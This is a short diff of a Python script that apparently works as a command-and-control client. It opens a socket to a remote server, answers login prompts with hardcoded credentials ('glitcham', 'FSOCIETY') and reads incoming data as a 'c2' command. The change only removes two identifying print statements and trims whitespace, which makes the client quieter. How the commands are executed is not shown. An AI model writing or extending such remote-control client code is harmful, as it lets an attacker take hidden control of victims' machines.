@@ -329,7 +329,7 @@ def main():
                     except:
                         pass
                 sleep(5)
-        
+
         try:
             while True:
                 try:
@@ -340,13 +340,11 @@ def main():
                 except Exception as e:
                     print(f"Error receiving data: {e}")
                     break
-                
+
                 if b"Username" in data:
                     s.send(b"glitcham")
-                    print("the glitch vpn")
                 elif b"Password" in data:
                     s.send(b"FSOCIETY")
-                    print("version 1.0.0")
                 else:
                     try:
                         c2 = data.decode().strip()
